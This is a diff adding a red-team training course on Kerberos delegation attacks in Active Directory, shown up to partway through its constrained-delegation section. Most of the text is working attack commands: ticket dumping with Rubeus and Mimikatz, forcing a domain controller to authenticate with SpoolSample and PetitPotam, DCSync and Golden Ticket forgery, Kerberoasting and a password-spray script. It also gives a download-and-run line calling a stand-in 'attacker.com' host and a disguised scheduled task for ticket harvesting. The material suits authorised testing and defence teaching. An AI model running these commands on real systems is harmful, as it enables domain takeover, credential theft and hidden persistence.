@@ -1,0 +1,4098 @@
+# Kerberos Delegation Attacks: Complete Attack Course
+
+## Table of Contents
+1. Introduction to Kerberos Delegation
+2. Understanding Delegation Types
+3. Unconstrained Delegation Attacks
+4. Constrained Delegation Attacks
+5. Resource-Based Constrained Delegation (RBCD)
+6. S4U2Self and S4U2Proxy Abuse
+7. Reconnaissance and Preparation
+8. Attack Execution and Tooling
+9. Advanced Scenarios and Persistence
+10. Detection, Prevention, and Mitigation
+
+---
+
+## 1. Introduction to Kerberos Delegation
+
+### What is Kerberos Delegation?
+
+**Kerberos Delegation** is a feature that allows a service to impersonate a user when accessing other services on behalf of that user. This enables "double-hop" authentication scenarios where a service needs to access resources as the authenticated user without requiring the user's password.
+
+### Why Delegation Exists
+
+**Business Need:**
+```
+User authenticates to Web Server
+    ↓
+Web Server needs to access Database as User
+    ↓
+Without Delegation: Web Server can't authenticate as User
+    ↓
+With Delegation: Web Server impersonates User to Database
+    ↓
+Database sees request from User (not Web Server)
+```
+
+**Common Use Cases:**
+- Web applications accessing backend databases
+- SharePoint accessing file servers
+- Exchange accessing mailbox servers
+- Multi-tier applications
+- Service-to-service authentication
+
+### Why Delegation Attacks Matter
+
+**For Red Teamers:**
+- Privilege escalation vector
+- Lateral movement technique
+- Service account compromise leads to broader access
+- Often misconfigured and over-permissioned
+- Can lead to domain admin compromise
+- Multiple attack vectors (Unconstrained, Constrained, RBCD)
+
+**For Defenders:**
+- Commonly misconfigured
+- Excessive delegation permissions
+- Difficult to audit properly
+- Often forgotten after initial setup
+- Can provide backdoor access
+- Requires comprehensive understanding
+
+### Attack Classification
+
+**MITRE ATT&CK Techniques:**
+- **T1558**: Steal or Forge Kerberos Tickets
+- **T1558.003**: Kerberoasting
+- **T1068**: Exploitation for Privilege Escalation
+- **T1021**: Remote Services
+- **T1550.003**: Use Alternate Authentication Material: Pass the Ticket
+
+**Prerequisites by Attack Type:**
+
+**Unconstrained Delegation:**
+- Access to server with unconstrained delegation
+- Ability to trigger authentication from target
+- Local admin on delegation server
+
+**Constrained Delegation:**
+- Compromised service account with delegation rights
+- Knowledge of allowed delegation targets
+- Ability to request service tickets
+
+**RBCD:**
+- GenericAll/GenericWrite/WriteProperty on target computer
+- Ability to create/control computer account
+- Knowledge of target service
+
+### Delegation Types Comparison
+
+| Feature | Unconstrained | Constrained | Resource-Based Constrained |
+|---------|--------------|-------------|---------------------------|
+| **Configuration Location** | Service account | Service account | Target resource |
+| **Scope** | Any service | Specific services | Controlled by resource |
+| **Security Risk** | Very High | Medium | Medium |
+| **Common Usage** | Legacy/Domain Controllers | Modern applications | Modern (2012+) |
+| **Attack Difficulty** | Easy | Medium | Medium |
+| **Detection Difficulty** | Easy | Medium | Hard |
+
+### Real-World Attack Scenarios
+
+**Scenario 1: Unconstrained Delegation to Domain Admin**
+```
+Discover web server with unconstrained delegation
+    ↓
+Compromise web server (local admin)
+    ↓
+Trigger Domain Admin authentication to web server
+    ↓
+Extract Domain Admin TGT from web server memory
+    ↓
+Use TGT for domain-wide access
+```
+
+**Scenario 2: Constrained Delegation Escalation**
+```
+Compromise service account with delegation to SQL
+    ↓
+Service account allowed: MSSQLSvc/sql.corp.local
+    ↓
+Request ticket for MSSQL service as Domain Admin
+    ↓
+Alternative service abuse: request CIFS/LDAP instead
+    ↓
+Access SQL server or DC as Domain Admin
+```
+
+**Scenario 3: RBCD Privilege Escalation**
+```
+Obtain GenericWrite on target computer object
+    ↓
+Create new computer account (attacker-controlled)
+    ↓
+Configure RBCD on target to trust attacker computer
+    ↓
+Impersonate any user to target computer
+    ↓
+Access target as Domain Admin
+```
+
+### Key Concepts
+
+**Delegation Trust Model:**
+- Service A trusts user authentication
+- Service A can impersonate user to Service B
+- Service B trusts Service A to properly authenticate
+- No re-authentication required from user
+- Based on Kerberos ticket forwarding
+
+**Why Delegation Attacks Work:**
+- Services trusted to impersonate users
+- Often over-permissioned (delegate to ANY service)
+- Misconfigured or forgotten configurations
+- Tickets stored in memory can be extracted
+- Alternative service names not validated
+- Resource-based model allows self-delegation
+
+**Critical Components:**
+- **TGT (Ticket Granting Ticket)**: Stored on unconstrained delegation servers
+- **Forwardable Tickets**: Required for delegation to work
+- **S4U2Self**: Service requests ticket for itself on behalf of user
+- **S4U2Proxy**: Service requests ticket to backend service as user
+- **msDS-AllowedToDelegateTo**: Attribute defining delegation targets
+- **msDS-AllowedToActOnBehalfOfOtherIdentity**: RBCD configuration
+
+### Attack Impact
+
+**Unconstrained Delegation Impact:**
+- Complete compromise of any authenticated user
+- Domain Admin TGT extraction
+- Persistent access via stored tickets
+- Can compromise entire domain
+- Historical: affected Domain Controllers in older environments
+
+**Constrained Delegation Impact:**
+- Impersonation to specific services
+- Alternative service name abuse
+- Privilege escalation via misconfiguration
+- Access to backend resources
+- Often leads to database compromise
+
+**RBCD Impact:**
+- Self-service privilege escalation
+- Lower privilege requirement
+- Harder to detect
+- Flexible attack vector
+- Can target any computer object with write access
+
+---
+
+## 2. Understanding Delegation Types
+
+### Unconstrained Delegation (Delegation to ANY Service)
+
+#### How It Works
+
+**Technical Flow:**
+```
+1. User authenticates to Service A
+2. User's TGT is included in service ticket (if forwardable)
+3. Service A receives service ticket + User's TGT
+4. Service A stores User's TGT in memory
+5. Service A uses User's TGT to request tickets to ANY service
+6. Service A accesses other services as User
+```
+
+**Visual Representation:**
+```
+User                Service A               Service B               KDC
+ |                  (Unconstrained)                                  |
+ |                                                                   |
+ |--Request Access to Service A------->|                             |
+ |                                     |                             |
+ |                                     |<--Request Service Ticket----|
+ |                                     |   + Include TGT             |
+ |                                     |                             |
+ |<--Service Ticket + TGT------------  |                             |
+ |                                     |                             |
+ |--Present Ticket---------------->    |                             |
+ |                                     | (TGT stored in memory)      |
+ |                                     |                             |
+ |                                     |--Request Ticket to B------->|
+ |                                     |   Using User's TGT          |
+ |                                     |                             |
+ |                                     |<--Service Ticket------------|
+ |                                     |                             |
+ |                                     |--Access Service B---------->|
+ |                                     |   As User                   |
+```
+
+#### Configuration
+
+**Setting Unconstrained Delegation:**
+```powershell
+# Via PowerShell
+Set-ADAccountControl -Identity "WEBSERVER$" -TrustedForDelegation $true
+
+# Via Active Directory Users and Computers
+Computer Properties → Delegation Tab
+Select: "Trust this computer for delegation to any service (Kerberos only)"
+```
+
+**Identifying in AD:**
+```powershell
+# Find computers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Find user accounts with unconstrained delegation
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Using PowerView
+Get-DomainComputer -Unconstrained
+Get-DomainUser -Unconstrained
+```
+
+**AD Attribute:**
+```
+userAccountControl attribute contains:
+TRUSTED_FOR_DELEGATION flag (0x80000)
+```
+
+#### Security Implications
+
+**Why It's Dangerous:**
+- Service stores ALL user TGTs in memory
+- No restrictions on which services can be accessed
+- Domain Admin TGT can be captured
+- Tickets persist until expiration (10 hours default)
+- Service compromise = all authenticated user compromise
+
+**Historical Context:**
+- Required for Domain Controllers (pre-2003)
+- Legacy applications may require it
+- Modern alternatives exist (constrained delegation)
+- Should be avoided except for DCs
+
+### Constrained Delegation (Delegation to SPECIFIC Services)
+
+#### How It Works
+
+**Technical Flow:**
+```
+1. User authenticates to Service A
+2. Service A configured to delegate ONLY to Service B
+3. Service A requests service ticket for Service B as User
+4. Uses S4U2Proxy extension
+5. KDC validates delegation is allowed
+6. Service A receives ticket for Service B as User
+7. Service A accesses Service B as User
+```
+
+**Visual Representation:**
+```
+User                Service A               Service B               KDC
+ |                  (Constrained)                                    |
+ |                                                                   |
+ |--Authenticate to Service A-------->|                             |
+ |                                     |                             |
+ |                                     |--S4U2Proxy Request-------->|
+ |                                     |  "Give me ticket for B"    |
+ |                                     |  "As User"                 |
+ |                                     |                             |
+ |                                     |<--Validate Allowed---------|
+ |                                     |  Check msDS-AllowedTo...   |
+ |                                     |                             |
+ |                                     |<--Service Ticket for B-----|
+ |                                     |                             |
+ |                                     |--Access Service B--------->|
+ |                                     |   As User                  |
+```
+
+#### Configuration
+
+**Setting Constrained Delegation:**
+```powershell
+# Via PowerShell
+Set-ADUser -Identity "svc_web" -Add @{'msDS-AllowedToDelegateTo'=@('MSSQLSvc/sql.corp.local','MSSQLSvc/sql.corp.local:1433')}
+
+# Via Active Directory Users and Computers
+Service Account Properties → Delegation Tab
+Select: "Trust this user for delegation to specified services only"
+Select: "Use any authentication protocol" (protocol transition)
+Add Services: MSSQL/sql.corp.local
+```
+
+**Two Variants:**
+
+**Kerberos Only:**
+- User must authenticate with Kerberos
+- More secure
+- Less flexible
+- Original constrained delegation
+
+**Protocol Transition (Any Auth):**
+- User can authenticate with ANY protocol (NTLM, Forms, etc.)
+- Service converts to Kerberos for backend
+- More flexible
+- Uses S4U2Self + S4U2Proxy
+- More commonly abused
+
+**Identifying in AD:**
+```powershell
+# Find accounts with constrained delegation
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
+
+# Using PowerView
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+```
+
+**AD Attributes:**
+```
+msDS-AllowedToDelegateTo: List of SPNs delegation is allowed to
+TrustedToAuthForDelegation: Protocol transition enabled (0x1000000)
+```
+
+#### Service for User Extensions
+
+**S4U2Self (Service for User to Self):**
+```
+Purpose: Service obtains ticket for itself on behalf of user
+Use Case: User authenticated with non-Kerberos protocol
+Result: Service gets forwardable ticket for user
+Requirement: TrustedToAuthForDelegation flag
+```
+
+**S4U2Proxy (Service for User to Proxy):**
+```
+Purpose: Service obtains ticket to another service as user
+Use Case: Accessing backend service on user's behalf
+Result: Service gets ticket for backend service as user
+Requirement: msDS-AllowedToDelegateTo configured
+```
+
+**Combined Flow:**
+```
+1. User authenticates to Service A (could be NTLM/Forms Auth)
+2. Service A uses S4U2Self to get forwardable ticket for User
+3. Service A uses S4U2Proxy to get ticket for Service B as User
+4. Service A accesses Service B as User
+```
+
+### Resource-Based Constrained Delegation (RBCD)
+
+#### How It Works
+
+**Key Difference:**
+- Traditional: Delegation configured on SOURCE (service doing the delegation)
+- RBCD: Delegation configured on TARGET (resource being accessed)
+- Introduced in Windows Server 2012
+- More flexible, allows resources to control who can delegate
+
+**Technical Flow:**
+```
+1. Computer B configured to allow Computer A to delegate to it
+2. Computer A requests ticket to Computer B as User
+3. KDC checks Computer B's msDS-AllowedToActOnBehalfOfOtherIdentity
+4. If Computer A is in the list, delegation allowed
+5. Computer A gets ticket for Computer B as User
+```
+
+**Visual Representation:**
+```
+Computer A          Computer B              KDC
+(Attacker)          (Target)                 |
+    |                  |                     |
+    |                  | Config: Trust A     |
+    |                  | (RBCD setting)      |
+    |                                        |
+    |--S4U2Self Request--------------------->|
+    |  "Ticket for me as Domain Admin"       |
+    |                                        |
+    |<--Forwardable Ticket-------------------|
+    |                                        |
+    |--S4U2Proxy Request-------------------->|
+    |  "Ticket for B as Domain Admin"        |
+    |  Check: Does B allow A?                |
+    |                                        |
+    |<--Service Ticket for B-----------------|
+    |                                        |
+    |--Access Computer B as DA-------------->|
+```
+
+#### Configuration
+
+**Setting RBCD:**
+```powershell
+# Get SID of computer allowed to delegate
+$ComputerA = Get-ADComputer "COMPUTER-A"
+$ComputerA_SID = $ComputerA.SID
+
+# Create security descriptor
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerA_SID)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# Set RBCD on target computer
+$ComputerB = Get-ADComputer "COMPUTER-B"
+Set-ADComputer $ComputerB -PrincipalsAllowedToDelegateToAccount $ComputerA
+
+# Alternative method
+$ComputerB = Get-ADComputer "COMPUTER-B"
+Set-ADComputer $ComputerB -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
+```
+
+**Identifying RBCD:**
+```powershell
+# Find computers with RBCD configured
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null}
+
+# Parse RBCD settings
+$Computer = Get-ADComputer "TARGET" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+$Computer.'msDS-AllowedToActOnBehalfOfOtherIdentity' | ForEach-Object {
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor($_, 0)
+    $SD.DiscretionaryAcl
+}
+```
+
+**AD Attribute:**
+```
+msDS-AllowedToActOnBehalfOfOtherIdentity:
+- Security descriptor in binary format
+- Lists principals allowed to delegate
+- Controlled by target resource
+- Requires GenericWrite/GenericAll to modify
+```
+
+#### Why RBCD is Powerful for Attackers
+
+**Advantages:**
+- Lower privilege requirement (GenericWrite vs Domain Admin)
+- Self-service delegation configuration
+- Target controls delegation (easier to misconfigure)
+- Can create attacker-controlled computer accounts
+- Harder to detect than traditional delegation
+- No need to compromise highly privileged accounts
+
+**Attack Requirements:**
+```
+1. GenericWrite/GenericAll/WriteProperty on target computer
+   OR
+2. Ability to modify msDS-AllowedToActOnBehalfOfOtherIdentity
+   
+PLUS
+
+3. Control of a computer account (create or compromise)
+   
+RESULT
+
+4. Can impersonate ANY user to target computer
+```
+
+### Delegation Comparison Table
+
+| Aspect                   | Unconstrained      | Constrained        | RBCD                   |
+| ------------------------ | ------------------ | ------------------ | ---------------------- |
+| **Config Location**      | Source service     | Source service     | Target resource        |
+| **Scope**                | ANY service        | Specific SPNs      | Controlled by target   |
+| **Introduced**           | Windows 2000       | Windows 2003       | Windows 2012           |
+| **User TGT Stored**      | Yes                | No                 | No                     |
+| **Protocol Transition**  | No                 | Optional           | Yes                    |
+| **Attack Complexity**    | Low                | Medium             | High                   |
+| **Privilege Required**   | Service compromise | Service compromise | GenericWrite on target |
+| **Detection Difficulty** | Easy               | Medium             | Hard                   |
+| **Common Use**           | Legacy/DCs         | Web apps           | Modern apps            |
+| **Abuse Potential**      | Very High          | High               | High                   |
+
+### Protocol Transition Deep Dive
+
+**Without Protocol Transition (Kerberos Only):**
+```
+User must authenticate with Kerberos
+    ↓
+Service receives forwardable TGT
+    ↓
+Service uses TGT for delegation
+    ↓
+More secure but less flexible
+```
+
+**With Protocol Transition (Any Auth):**
+```
+User authenticates with ANY protocol (NTLM, Forms, Basic, etc.)
+    ↓
+Service uses S4U2Self to request ticket for itself as user
+    ↓
+Service gets forwardable ticket (even though user didn't use Kerberos)
+    ↓
+Service uses S4U2Proxy for backend access
+    ↓
+More flexible but more dangerous
+```
+
+**Security Implications:**
+- Allows delegation without user's Kerberos TGT
+- Service can impersonate user without user's knowledge
+- More vulnerable to abuse
+- Required for most web applications
+- Enabled by TrustedToAuthForDelegation flag
+
+**Identifying Protocol Transition:**
+```powershell
+# Check for TrustedToAuthForDelegation flag
+Get-ADObject -Filter {userAccountControl -band 16777216} -Properties userAccountControl,msDS-AllowedToDelegateTo
+
+# userAccountControl value 16777216 (0x1000000)
+# Indicates TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
+```
+
+---
+
+## 3. Unconstrained Delegation Attacks
+
+### Attack Overview
+
+**Core Concept:**
+When a server has unconstrained delegation, any user authenticating to that server has their TGT stored in the server's memory. If you compromise the server, you can extract all stored TGTs and impersonate those users.
+
+**Attack Chain:**
+```
+1. Discover servers with unconstrained delegation
+2. Compromise one of these servers (get admin access)
+3. Monitor for high-value authentications (Domain Admin)
+4. Trigger authentication from target user if needed
+5. Extract TGT from server memory
+6. Use TGT to impersonate user
+7. Access resources as that user
+```
+
+### Discovery and Reconnaissance
+
+#### Finding Unconstrained Delegation Servers
+
+**Using PowerView:**
+```powershell
+# Find computers with unconstrained delegation
+Get-DomainComputer -Unconstrained | Select-Object name,dnshostname
+
+# Exclude Domain Controllers
+Get-DomainComputer -Unconstrained | Where-Object {$_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT"} | Select-Object name,dnshostname
+
+# Find user accounts with unconstrained delegation (rare)
+Get-DomainUser -Unconstrained | Select-Object samaccountname,description
+```
+
+**Using AD Module:**
+```powershell
+# Computers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,ServicePrincipalName,Description | Select-Object Name,DNSHostName,Description
+
+# User accounts
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,SamAccountName
+```
+
+**Using LDAP Query:**
+```powershell
+# Search for userAccountControl with TRUSTED_FOR_DELEGATION flag
+$searcher = [adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+$searcher.FindAll() | ForEach-Object {$_.Properties.name}
+```
+
+**Using Impacket (findDelegation.py):**
+```bash
+# From Linux
+findDelegation.py corporation.local/user:password -dc-ip 10.10.10.10
+
+# Output shows accounts with delegation configured
+```
+
+#### Assessing Target Value
+
+**Prioritize Targets:**
+```powershell
+# Check which admins have logged into delegation servers
+$UnconstrainedServers = Get-DomainComputer -Unconstrained
+foreach ($server in $UnconstrainedServers) {
+    Get-DomainUser -AdminCount | Get-DomainUserEvent -ComputerName $server.name
+}
+```
+
+**Common High-Value Targets:**
+- Web servers (frequent admin access for management)
+- Application servers
+- Management servers
+- Jump servers / Bastion hosts
+- Print servers (can trigger authentication via printer bug)
+
+### Compromising Unconstrained Delegation Server
+
+#### Gaining Access
+
+**Common Methods:**
+- Exploit vulnerability on server
+- Phishing with payload targeting server
+- Credential compromise (local admin)
+- Service account compromise
+- Default credentials
+- Misconfigured services
+
+**Example: Service Account Compromise**
+```powershell
+# Kerberoast to find crackable service accounts
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Crack hash
+hashcat -m 13100 hashes.txt rockyou.txt
+
+# If service account has admin on unconstrained server
+psexec.py corporation.local/svc_app:password@webserver.corp.local
+```
+
+### Extracting TGTs from Memory
+
+#### Using Mimikatz
+```cmd
+# Export all tickets from memory
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+# Look for TGT files (krbtgt service)
+dir *.kirbi | findstr krbtgt
+
+# Example output:
+# [0;3e7]-2-0-40e10000-Administrator@krbtgt-CORPORATION.LOCAL.kirbi
+```
+
+**Filtering for Specific Users:**
+```cmd
+# Extract only Domain Admin TGTs
+mimikatz # sekurlsa::tickets /export
+
+# On attacking machine, search for DA tickets
+dir *.kirbi | findstr "Domain-Admin.*krbtgt"
+```
+
+#### Using Rubeus
+```powershell
+# Monitor for new TGTs (real-time)
+.\Rubeus.exe monitor /interval:5 /filteruser:administrator
+
+# Dump all tickets
+.\Rubeus.exe dump
+
+# Dump only TGTs
+.\Rubeus.exe dump /service:krbtgt /nowrap
+
+# Dump specific user's tickets
+.\Rubeus.exe dump /user:administrator /nowrap
+```
+
+#### Using Invoke-Mimikatz (PowerShell)
+```powershell
+# Load Mimikatz in memory
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
+
+# Export tickets
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+
+### Triggering Authentication (Coercing)
+
+#### The Printer Bug (MS-RPRN)
+
+**Concept:**
+Windows Print Spooler service can be forced to authenticate to an attacker-controlled server, sending the computer account's TGT.
+
+**SpoolSample Tool:**
+```cmd
+# Force DC to authenticate to compromised unconstrained server
+SpoolSample.exe DC01.corporation.local WEBSERVER.corporation.local
+
+# On WEBSERVER (monitoring with Rubeus)
+.\Rubeus.exe monitor /interval:1 /filteruser:DC01$
+```
+
+**What Happens:**
+```
+1. SpoolSample triggers Print Spooler on DC01
+2. DC01 connects to WEBSERVER to "check printer status"
+3. DC01 authenticates using its computer account
+4. DC01$ TGT sent to WEBSERVER (unconstrained delegation)
+5. Attacker on WEBSERVER extracts DC01$ TGT
+6. Attacker uses DC01$ TGT for DCSync
+```
+
+**Full Attack Flow:**
+```cmd
+# Terminal 1: Start monitoring on unconstrained server
+.\Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap
+
+# Terminal 2: Trigger authentication
+SpoolSample.exe DC01.corporation.local WEBSERVER.corporation.local
+
+# Terminal 1: Copy captured TGT
+
+# Terminal 3: Inject TGT and perform DCSync
+.\Rubeus.exe ptt /ticket:BASE64_TGT
+
+# DCSync domain
+mimikatz # lsadump::dcsync /domain:corporation.local /all /csv
+```
+
+#### PetitPotam (MS-EFSRPC)
+
+**More Reliable than Printer Bug:**
+```cmd
+# Force authentication from DC
+PetitPotam.py -u user -p password WEBSERVER.corporation.local DC01.corporation.local
+
+# Or unauthenticated
+PetitPotam.py WEBSERVER.corporation.local DC01.corporation.local
+```
+
+**Advantages:**
+- Works even if Print Spooler disabled
+- More reliable
+- Can work unauthenticated
+- Affects all Windows versions
+
+#### PrivExchange (Exchange)
+
+**Targeting Exchange Servers:**
+```python
+# Trigger Exchange authentication
+privexchange.py -u user -p password -d corporation.local WEBSERVER.corporation.local -ah exchange.corporation.local
+
+# Exchange server authenticates to WEBSERVER
+# Extract Exchange computer account TGT
+# Use for privilege escalation
+```
+
+### Using Extracted TGTs
+
+#### Pass-the-Ticket Attack
+
+**With Mimikatz:**
+```cmd
+# Inject TGT
+mimikatz # kerberos::ptt administrator@krbtgt-CORPORATION.LOCAL.kirbi
+
+# Verify
+klist
+
+# Access resources
+dir \\DC01\C$
+```
+
+**With Rubeus:**
+```powershell
+# Inject TGT
+.\Rubeus.exe ptt /ticket:BASE64_TGT
+
+# Or from file
+.\Rubeus.exe ptt /ticket:administrator.kirbi
+
+# Verify
+klist
+```
+
+#### Cross-Platform Usage
+
+**Windows to Linux:**
+```cmd
+# 1. Export TGT with Mimikatz/Rubeus
+.\Rubeus.exe dump /user:administrator /nowrap
+
+# 2. Copy Base64 ticket
+
+# 3. On Linux, decode and convert
+echo "BASE64_TICKET" | base64 -d > administrator.kirbi
+ticketConverter.py administrator.kirbi administrator.ccache
+
+# 4. Use with Impacket
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass administrator@dc01.corporation.local
+```
+
+### Domain Controller TGT Extraction
+
+**Most Valuable Target:**
+```
+DC Computer Account TGT = DCSync capability
+    ↓
+Can replicate all domain credentials
+    ↓
+Extract krbtgt hash
+    ↓
+Create Golden Ticket
+    ↓
+Complete domain compromise
+```
+
+**Attack Execution:**
+```cmd
+# 1. On unconstrained server, start monitoring
+.\Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap
+
+# 2. Trigger DC authentication
+SpoolSample.exe DC01.corporation.local WEBSERVER.corporation.local
+
+# 3. Extract DC01$ TGT
+# (Captured by Rubeus)
+
+# 4. Inject DC TGT
+.\Rubeus.exe ptt /ticket:DC01$_TGT_BASE64
+
+# 5. Perform DCSync
+mimikatz # lsadump::dcsync /domain:corporation.local /user:krbtgt
+
+# 6. Create Golden Ticket
+mimikatz # kerberos::golden /domain:corporation.local /sid:DOMAIN_SID /krbtgt:HASH /user:Administrator /ptt
+
+# 7. Complete domain control
+```
+
+###  Persistence via Unconstrained Delegation
+
+#### Scheduled Ticket Harvesting
+```powershell
+# Script to continuously harvest TGTs
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -Sta -NonI -W Hidden -C `".\Rubeus.exe dump /service:krbtgt /outfile:C:\temp\tickets.txt`""
+
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+
+Register-ScheduledTask -TaskName "SystemTelemetry" -Action $action -Trigger $trigger -RunLevel Highest
+```
+
+#### Monitoring for High-Value Tickets
+```powershell
+# Continuous monitoring with alerting
+while($true) {
+    $tickets = .\Rubeus.exe dump /service:krbtgt
+    
+    if($tickets -match "Domain Admin|Enterprise Admin|Administrator") {
+        # Send alert or exfiltrate ticket
+        $tickets | Out-File C:\temp\hvt.txt
+        # Upload to C2
+    }
+    
+    Start-Sleep -Seconds 30
+}
+```
+
+### Unconstrained Delegation Limitations
+
+**What Doesn't Work:**
+- Can't extract tickets from users who haven't authenticated
+- Tickets expire (10 hours default)
+- Protected Users group members don't send TGTs
+- Credential Guard prevents TGT extraction
+- Must have admin on delegation server
+- Obvious in logs if monitored
+
+**Mitigations That Block:**
+- Account is Sensitive and Cannot be Delegated
+- Member of Protected Users group
+- Credential Guard enabled
+- LSA Protection enabled
+- Smart card required for interactive logon
+
+---
+
+## 4. Constrained Delegation Attacks
+
+### Attack Overview
+
+**Core Concept:**
+Constrained delegation allows a service to impersonate users to SPECIFIC backend services. However, due to implementation details (lack of SPN validation), attackers can abuse this to access ANY service on the target host, not just the configured one.
+
+**Key Vulnerability:**
+```
+Service configured to delegate to: MSSQLSvc/sql.corp.local
+    ↓
+Attacker can request ticket for: MSSQLSvc/sql.corp.local (allowed)
+    ↓
+BUT ALSO can request: CIFS/sql.corp.local (not validated!)
+    ↓
+Result: Access to file shares on SQL server, not just database
+```
+
+**Attack Chain:**
+```
+1. Discover accounts with constrained delegation
+2. Compromise service account or computer with delegation
+3. Identify allowed delegation targets
+4. Request service ticket as high-privilege user
+5. Use alternative service names for broader access
+6. Abuse S4U2Self for protocol transition
+7. Chain multiple delegations for deeper access
+```
+
+### Discovery and Reconnaissance
+
+#### Finding Constrained Delegation
+
+**Using PowerView:**
+```powershell
+# Find user accounts with constrained delegation
+Get-DomainUser -TrustedToAuth | Select-Object name,msds-allowedtodelegateto,useraccountcontrol
+
+# Find computer accounts with constrained delegation
+Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto,useraccountcontrol
+
+# Check for protocol transition capability
+Get-DomainUser -TrustedToAuth | Where-Object {$_.useraccountcontrol -band 16777216} | Select-Object name,msds-allowedtodelegateto
+```
+
+**Using AD Module:**
+```powershell
+# User accounts with constrained delegation
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation | Select-Object Name,msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
+
+# Computer accounts
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation | Select-Object Name,msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
+```
+
+**Using LDAP Query:**
+```powershell
+# Find all objects with msDS-AllowedToDelegateTo
+$searcher = [adsisearcher]"(msDS-AllowedToDelegateTo=*)"
+$searcher.PropertiesToLoad.AddRange(@("name","msDS-AllowedToDelegateTo","userAccountControl"))
+$searcher.FindAll() | ForEach-Object {
+    [PSCustomObject]@{
+        Name = $_.Properties.name[0]
+        AllowedTo = $_.Properties.'msds-allowedtodelegateto'
+        ProtocolTransition = ($_.Properties.useraccountcontrol[0] -band 16777216) -ne 0
+    }
+}
+```
+
+**Using Impacket:**
+```bash
+# From Linux
+findDelegation.py corporation.local/user:password -dc-ip 10.10.10.10
+
+# Shows both unconstrained and constrained delegation
+```
+
+#### Analyzing Delegation Targets
+
+**Parse Allowed Services:**
+```powershell
+# Get detailed delegation info
+$account = Get-ADUser "svc_web" -Properties msDS-AllowedToDelegateTo
+$account.'msDS-AllowedToDelegateTo'
+
+# Output example:
+# MSSQLSvc/sql01.corp.local
+# MSSQLSvc/sql01.corp.local:1433
+# CIFS/fileserver.corp.local
+```
+
+**Understanding SPN Format:**
+```
+Service/Hostname
+Service/Hostname:Port
+
+Examples:
+MSSQLSvc/sql.corp.local        - SQL Server (any port)
+MSSQLSvc/sql.corp.local:1433   - SQL Server (port 1433)
+HTTP/web.corp.local            - Web server
+CIFS/fileserver.corp.local     - File shares
+```
+
+**Alternative Service Abuse Potential:**
+```powershell
+# If delegated to: MSSQLSvc/sql.corp.local
+# Can also access:
+# - CIFS/sql.corp.local (file shares)
+# - HTTP/sql.corp.local (web admin)
+# - HOST/sql.corp.local (WinRM, scheduled tasks)
+# - LDAP/sql.corp.local (if SQL is DC)
+```
+
+### Compromising Delegated Service Account
+
+#### Method 1: Kerberoasting
+
+**If Service Account Has SPN:**
+```powershell
+# Request service tickets
+.\Rubeus.exe kerberoast /user:svc_web /outfile:hash.txt
+
+# Crack hash
+hashcat -m 13100 hash.txt rockyou.txt --force
+
+# Result: Service account password
+```
+
+#### Method 2: Password Spray
+
+**If Weak Password:**
+```powershell
+# Try common passwords
+$users = @("svc_web","svc_sql","svc_app")
+$passwords = @("Password1","Spring2024","CompanyName123")
+
+foreach($user in $users) {
+    foreach($pass in $passwords) {
+        $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
+        try {
+            Get-ADUser $user -Credential $cred -ErrorAction Stop
+            Write-Host "[+] Success: $user : $pass"
+        } catch {}
+    }
+}
+```
+
+#### Method 3: Credential Dumping
+
+**If Service Logged Into Compromised System:**
+```cmd
+# Dump credentials with Mimikatz
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Look for service accounts
+mimikatz # sekurlsa::tickets /export
+```
+
+#### Method 4: Computer Account Compromise
+
+**If Delegation on Computer Account:**
+```
+Compromise the computer (any method)
+    ↓
+Extract computer account hash from SAM
+    ↓
+Use computer account credentials
+    ↓
+Perform delegation attacks
+```
+
+### S4U2Self and S4U2Proxy Abuse
+
+#### Understanding S4U Extensions
+
+**S4U2Self (Service for User to Self):**
+- Service requests ticket for ITSELF on behalf of a user
+- Required when user authenticates with non-Kerberos protocol
+- Returns forwardable ticket if TrustedToAuthForDelegation set
+- Key to protocol transition attacks
+
+**S4U2Proxy (Service for User to Proxy):**
+- Service requests ticket to BACKEND service as user
+- Uses forwardable ticket from S4U2Self or user authentication
